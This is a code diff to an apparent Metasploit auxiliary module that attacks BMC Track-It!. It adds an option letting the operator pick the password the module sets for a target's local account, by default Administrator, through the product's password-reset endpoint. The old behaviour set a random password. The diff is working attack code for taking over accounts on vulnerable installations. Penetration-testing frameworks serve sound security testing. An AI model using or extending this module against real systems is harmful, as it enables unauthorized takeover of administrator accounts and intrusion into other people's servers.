@@ -35,6 +35,7 @@ class Metasploit4 < Msf::Auxiliary
       [
         OptString.new('TARGETURI', [true, 'The path to BMC TrackIt!', '/']),
         OptString.new('LOCALUSER', [true, 'The local user to change password for', 'Administrator']),
+        OptString.new('LOCALPASS', [false, 'The password to set for the local user (blank for random)', '']),
         OptString.new('DOMAIN', [false, 'The domain of the user. By default the local user\'s computer name will be autodetected', ''])
       ], self.class)
   end
@@ -142,7 +143,13 @@ class Metasploit4 < Msf::Auxiliary
     end
 
     vprint_status("#{peer}: changing password for #{full_user}")
-    password = Rex::Text.rand_text_alpha(10) + "!1"
+
+    if datastore['LOCALPASS'].blank?
+      password = Rex::Text.rand_text_alpha(10) + "!1"
+    else
+      password = datastore['LOCALPASS']
+    end
+
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'ResetPassword'),
       'method' => 'POST',
